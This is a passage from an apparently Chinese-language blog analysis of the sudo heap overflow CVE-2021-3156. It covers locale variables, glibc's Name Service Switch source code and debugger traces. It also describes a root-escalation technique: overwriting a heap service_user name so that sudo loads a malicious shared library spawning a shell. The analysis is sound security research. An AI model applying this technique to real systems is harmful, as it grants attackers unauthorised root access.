title="背景知识"></a>背景知识</h3><p>这在进行分析之前我们首先需要了解一下<code>locale</code>和<code>nss</code>相关的信息。</p><p><code>locale</code>是根据计算机用户所使用的语言，所在的国家和地区所定义的一个软件运行时的语言环境，通常通过环境变量进行设置，<code>locale</code>相关的环境变量生效的顺序如下</p><ol><li><code>LANGUAGE</code>指定个人对语言环境的主次偏好，如<code>zh_CN:en_US</code></li><li><code>LC_ALL</code>是一个可以被<code>setlocale</code>设置的宏，其值可以覆盖所有其他的<code>locale</code>设定</li><li><code>LC_XXX</code>详细设定<code>locale</code>的各个方面，可以覆盖<code>LANG</code>的值</li><li><code>LANG</code>指定默认使用的<code>locale</code></li></ol><p>当<code>LC_ALL/LANG</code>被设置为<code>C</code>的时候，<code>LANGUAGE</code>的值将会被忽略。其命名规则如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language[_territory[.codeset]][@modifier]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中<code>language</code>是<a href="https://zh.wikipedia.org/wiki/ISO_639-1">ISO 639-1</a>标准中定义的双字母的语言代码，<code>territory</code>是<a href="https://zh.wikipedia.org/wiki/ISO_3166-1">ISO 3166-1</a>标准中定义的双字母的国家和地区代码，<code>codeset</code>是字符集的名称 (如 UTF-8等)，而 <code>modifier</code> 则是某些<code>locale</code>变体的修正符。我们可以详细的设置共<code>12</code>个环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _nl_category_names</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  str41 = <span class="string">&quot;LC_COLLATE&quot;</span>,</span><br><span class="line">  str67 = <span class="string">&quot;LC_CTYPE&quot;</span>,</span><br><span class="line">  str140 = <span class="string">&quot;LC_MONETARY&quot;</span>,</span><br><span class="line">  str193 = <span class="string">&quot;LC_NUMERIC&quot;</span>,</span><br><span class="line">  str207 = <span class="string">&quot;LC_TIME&quot;</span>,</span><br><span class="line">  str259 = <span class="string">&quot;LC_MESSAGES&quot;</span>,</span><br><span class="line">  str270 = <span class="string">&quot;LC_PAPER&quot;</span>,</span><br><span class="line">  str279 = <span class="string">&quot;LC_NAME&quot;</span>,</span><br><span class="line">  str292 = <span class="string">&quot;LC_ADDRESS&quot;</span>,</span><br><span class="line">  str311 = <span class="string">&quot;LC_TELEPHONE&quot;</span>,</span><br><span class="line">  str322 = <span class="string">&quot;LC_MEASUREMENT&quot;</span>,</span><br><span class="line">  str330 = <span class="string">&quot;LC_IDENTIFICATION&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>nss</code>全称为<code>Name Service Switch</code>，在<code>*nix</code>操作系统中，<code>nss</code>是<code>C</code>语言库的一部分，用来解析<code>name</code>，比如登陆用户的用户名以及<code>IP</code>地址到域名的解析。举个例子，当我们输入命令<code>ls -alg</code>即查看一个目录中的文件列表，对于每一个文件我们可以看到它所属的用户和用户组，但是实际上系统中只保存了用户和用户组的<code>id</code>，要想显示与之相关的字符这就需要<code>nss</code>进行解析。我们可以在配置文件<code>/etc/nsswitch.conf</code>中定义相关数据库的查找规范</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@2c3723801aeb:/home/normal/CVE-2021-3156_blasty<span class="comment"># cat /etc/nsswitch.conf</span></span><br><span class="line"><span class="comment"># /etc/nsswitch.conf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example configuration of GNU Name Service Switch functionality.</span></span><br><span class="line"><span class="comment"># If you have the `glibc-doc-reference&#x27; and `info&#x27; packages installed, try:</span></span><br><span class="line"><span class="comment"># `info libc &quot;Name Service Switch&quot;&#x27; for information about this file.</span></span><br><span class="line"></span><br><span class="line">passwd:         files systemd</span><br><span class="line">group:          files systemd</span><br><span class="line">shadow:         files</span><br><span class="line">gshadow:        files</span><br><span class="line"></span><br><span class="line">hosts:          files dns</span><br><span class="line">networks:       files</span><br><span class="line"></span><br><span class="line">protocols:      db files</span><br><span class="line">services:       db files</span><br><span class="line">ethers:         db files</span><br><span class="line">rpc:            db files</span><br><span class="line"></span><br><span class="line">netgroup:       nis</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于每个可用的查找规范即<code>service</code>都必须有文件<code>libnss_service.so.2</code>与之对应，例如<code>group</code>数据库定义了查找规范<code>files</code>，那么在调用<code>getgroup</code>函数的时候就会调用<code>libnss_files.so.2</code>中的<code>nss_lookup_function</code>函数进行查找。因此我们可以在<code>ubuntu</code>中找到下面的共享库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">libnss_compat-2.31.so</span><br><span class="line">libnss_compat.so</span><br><span class="line">libnss_compat.so.2</span><br><span class="line">libnss_dns-2.31.so</span><br><span class="line">libnss_dns.so</span><br><span class="line">libnss_dns.so.2</span><br><span class="line">libnss_files-2.31.so</span><br><span class="line">libnss_files.so</span><br><span class="line">libnss_files.so.2</span><br><span class="line">libnss_hesiod-2.31.so</span><br><span class="line">libnss_hesiod.so</span><br><span class="line">libnss_hesiod.so.2</span><br><span class="line">libnss_nis-2.31.so</span><br><span class="line">libnss_nis.so</span><br><span class="line">libnss_nis.so.2</span><br><span class="line">libnss_nisplus-2.31.so</span><br><span class="line">libnss_nisplus.so</span><br><span class="line">libnss_nisplus.so.2</span><br><span class="line">libnss_systemd.so.2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正常情况下当<code>sudo</code>调用到<code>__nss_lookup_function</code>情况如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">In file: /root/glibc/sourceCode/glibc-2.31/nss/nsswitch.c</span><br><span class="line">   408 <span class="comment">#endif</span></span><br><span class="line">   409</span><br><span class="line">   410</span><br><span class="line">   411 void *</span><br><span class="line">   412 __nss_lookup_function (service_user *ni, const char *fct_name)</span><br><span class="line"> ► 413 &#123;</span><br><span class="line">   414   void **found, *result;</span><br><span class="line">   415</span><br><span class="line">   416   /* We now modify global data.  Protect it.  */</span><br><span class="line">   417   __libc_lock_lock (lock);</span><br><span class="line">   418</span><br><span class="line">───────────────────[ STACK]─────────</span><br><span class="line">00:0000│ rsp  0x7fffffffe358 —▸ 0x7ffff7e3713f (internal_getgrouplist+175) ◂— <span class="built_in">test</span>   rax, rax</span><br><span class="line">01:0008│      0x7fffffffe360 ◂— 0x25b000000ae</span><br><span class="line">02:0010│      0x7fffffffe368 ◂— 0xffffff0000007d /* <span class="string">&#x27;&#125;&#x27;</span> */</span><br><span class="line">03:0018│      0x7fffffffe370 ◂— 0xffffffffffffffff</span><br><span class="line">04:0020│      0x7fffffffe378 —▸ 0x7fffffffe380 ◂— 0x1</span><br><span class="line">05:0028│      0x7fffffffe380 ◂— 0x1</span><br><span class="line">06:0030│      0x7fffffffe388 ◂— 0xc4e5bb2d41c2d00</span><br><span class="line">07:0038│      0x7fffffffe390 ◂— 0x0</span><br><span class="line">───────────────────[ BACKTRACE ]─────────────────</span><br><span class="line"> ► f 0     7ffff7e9bdf0 __nss_lookup_function</span><br><span class="line">   f 1     7ffff7e3713f internal_getgrouplist+175</span><br><span class="line">   f 2     7ffff7e373ed getgrouplist+109</span><br><span class="line">   f 3     7ffff7f4fe16 sudo_getgrouplist2_v1+198</span><br><span class="line">   f 4     7ffff7c53d63 sudo_make_gidlist_item+451</span><br><span class="line">   f 5     7ffff7c52b0e sudo_get_gidlist+286</span><br><span class="line">   f 6     7ffff7c4c86d runas_getgroups+93</span><br><span class="line">   f 7     7ffff7c39d32 set_perms+1650</span><br><span class="line">───────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p *ni</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  next = 0x55555557fc10,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN&#125;,</span><br><span class="line">  library = 0x0,</span><br><span class="line">  known = 0x0,</span><br><span class="line">  name = 0x55555557fc00 <span class="string">&quot;files&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(ni-&gt;next)</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  next = 0x0,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN&#125;,</span><br><span class="line">  library = 0x0,</span><br><span class="line">  known = 0x0,</span><br><span class="line">  name = 0x55555557fc40 <span class="string">&quot;systemd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当调用<code>getgroup</code>函数的时候，<code>__nss_lookup_function</code>会依次加载<code>files,systemd</code>这两个<code>service name</code>。而这两个<code>service name</code>的信息是存储在堆空间中的。看一下<code>__nss_lookup_function</code>函数的具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__nss_lookup_function (service_user *ni, <span class="type">const</span> <span class="type">char</span> *fct_name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> **found, *result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We now modify global data.  Protect it.  */</span></span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the tree of functions previously requested.  Data in the</span></span><br><span class="line"><span class="comment">     tree are `known_function&#x27; structures, whose first member is a</span></span><br><span class="line"><span class="comment">     `const char *&#x27;, the lookup key.  The search returns a pointer to</span></span><br><span class="line"><span class="comment">     the tree node structure; the first member of the is a pointer to</span></span><br><span class="line"><span class="comment">     our structure (i.e. what will be a `known_function&#x27;); since the</span></span><br><span class="line"><span class="comment">     first member of that is the lookup key string, &amp;FCT_NAME is close</span></span><br><span class="line"><span class="comment">     enough to a pointer to our structure to use as a lookup key that</span></span><br><span class="line"><span class="comment">     will be passed to `known_compare&#x27; (above).  */</span></span><br><span class="line"></span><br><span class="line">  found = __tsearch (&amp;fct_name, &amp;ni-&gt;known, &amp;known_compare);</span><br><span class="line">  <span class="keyword">if</span> (found == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* This means out-of-memory.  */</span></span><br><span class="line">    result = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*found != &amp;fct_name)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This name was not known before.  Now we have a node in the tree</span></span><br><span class="line"><span class="comment"> (in the proper sorted position for FCT_NAME) that points to</span></span><br><span class="line"><span class="comment"> &amp;FCT_NAME instead of any real `known_function&#x27; structure.</span></span><br><span class="line"><span class="comment"> Allocate a new structure and fill it in.  */</span></span><br><span class="line"></span><br><span class="line">      known_function *known = <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> *known);</span><br><span class="line">      <span class="keyword">if</span> (! known)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Point the tree node at this new structure.  */</span></span><br><span class="line">  *found = known;</span><br><span class="line">  known-&gt;fct_name = fct_name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">  <span class="comment">/* Load the appropriate library.  */</span></span><br><span class="line">  <span class="keyword">if</span> (nss_load_library (ni) != <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* This only happens when out of memory.  */</span></span><br><span class="line">    <span class="keyword">goto</span> remove_from_tree;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__nss_lookup_function)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在调用<code>nss_lookup_function</code>的时候一般<code>fct_name</code>是固定的字符串，所以这里我们直接进入<code>nss_load_library</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">nss_load_library</span> <span class="params">(service_user *ni)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment"> library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment"> is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment"> holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment"> default configuration.  */</span></span><br><span class="line">      <span class="type">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line">     ni-&gt;name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="type">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">      + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="type">int</span> saved_errno = errno;</span><br><span class="line">      <span class="type">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line">      <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line">    ni-&gt;name),</span><br><span class="line">  <span class="string">&quot;.so&quot;</span>),</span><br><span class="line">__nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> USE_NSCD</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (is_nscd)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> service_library *</span><br><span class="line"><span class="title function_">nss_new_service</span> <span class="params">(name_database *database, <span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  service_library **currentp = &amp;database-&gt;library;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*currentp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span> ((*currentp)-&gt;name, name) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> *currentp;</span><br><span class="line">      currentp = &amp;(*currentp)-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have to add the new service.  */</span></span><br><span class="line">  *currentp = (service_library *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (service_library));</span><br><span class="line">  <span class="keyword">if</span> (*currentp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  (*currentp)-&gt;name = name;</span><br><span class="line">  (*currentp)-&gt;lib_handle = <span class="literal">NULL</span>;</span><br><span class="line">  (*currentp)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> *currentp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码中我们可以看出，如果<code>ni-&gt;library=NULL</code>，那么就会调用<code>nss_new_service</code>函数为其分配一个堆块，并对<code>name,lib_handle,next</code>赋值，完成之后进入<code>if (ni-&gt;library-&gt;lib_handle == NULL)</code>分支，对<code>name</code>进行字符串拼接，也就是<code>libnss_+name+&#39;.so.2&#39;</code>，之后就会调用<code>__libc_dlopen</code>函数加载动态链接库。</p><p>由于<code>ni</code>的<code>service name</code>结构体是分配在堆空间中的，而现在我们有存在<code>user_args</code>的堆溢出的漏洞，那么如果我们利用堆溢出将<code>service name</code>结构体的除<code>name</code>之外的其他成员变量全部覆写为<code>0</code>，<code>name</code>覆写为<code>x/x</code>那么经过字符串拼接之后就会加载<code>libnss_x/x.so.2</code>的动态链接库，我们将<code>getshell</code>的代码写入<code>_init</code>之后编译为动态链接库即可。</p><p>接下来就是如何溢出的问题。为了防止溢出过程中覆写中间的关键结构体，<code>user_args</code>与<code>service name</code>之间的距离要尽可能的小，最好的方法就是在<code>service name</code>上方人为的释放一个堆块，之后<code>user_args</code>再申请该堆块进行溢出。目前分析的<code>exp</code>是通过<code>setlocale</code>实现的。我们首先来看一下<code>service_user</code>的初始化过程</p><p>在<code>sudo.c:191</code>会调用<code>get_user_info</code>函数在获取用户信息的时候需要获取用户的用户名和口令信息，这就需要到了<code>nss</code>服务，也就是需要调用<code>passwd</code>对应的服务规范。在函数中会调用根据配置文件初始化<code>file/systemd</code>等服务规范，调用栈如下</p><img src="/[https:/image.lyyl.online/images/2021/02/07/image-20210204170734674.png](https:/image.lyyl.online/images/2021/02/07/image-20210204170734674.png)" alt="图片无法显示，请联系作者" title=" "><p>其中关键的逻辑代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__nss_database_lookup2 (<span class="type">const</span> <span class="type">char</span> *database, <span class="type">const</span> <span class="type">char</span> *alternate_name,</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *defconfig, service_user **ni)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> (service_table == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* Read config file.  */</span></span><br><span class="line">    service_table = nss_parse_file (_PATH_NSSWITCH_CONF);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> name_database *</span><br><span class="line"><span class="title function_">nss_parse_file</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *fname)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  fp = fopen (fname, <span class="string">&quot;rce&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  result = (name_database *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (name_database));</span><br><span class="line">  <span class="keyword">if</span> (result == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fclose (fp);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result-&gt;entry = <span class="literal">NULL</span>;</span><br><span class="line">  result-&gt;library = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    name_database_entry *this;</span><br><span class="line">    <span class="type">ssize_t</span> n;</span><br><span class="line"></span><br><span class="line">    n = __getline (&amp;line, &amp;len, fp);</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (line[n - <span class="number">1</span>] == <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">      line[n - <span class="number">1</span>] = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Because the file format does not know any form of quoting we</span></span><br><span class="line"><span class="comment"> can search forward for the next &#x27;#&#x27; character and if found</span></span><br><span class="line"><span class="comment"> make it terminating the line.  */</span></span><br><span class="line">    *__strchrnul (line, <span class="string">&#x27;#&#x27;</span>) = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the line is blank it is ignored.  */</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each line completely specifies the actions for a database.  */</span></span><br><span class="line">    this = nss_getline (line);<span class="comment">// 处理配置文件中的每一行</span></span><br><span class="line">    <span class="keyword">if</span> (this != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (last != <span class="literal">NULL</span>)</span><br><span class="line">        last-&gt;next = this;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        result-&gt;entry = this;</span><br><span class="line"></span><br><span class="line">      last = this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (!__feof_unlocked (fp));</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> name_database_entry *</span><br><span class="line"><span class="title function_">nss_getline</span> <span class="params">(<span class="type">char</span> *line)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  result-&gt;service = nss_parse_service_list (line);<span class="comment">// 处理文件中该行的所有服务规范</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> service_user *</span><br><span class="line"><span class="title function_">nss_parse_service_list</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *line)</span><span class="comment">// 处理每一个服务规范</span></span><br><span 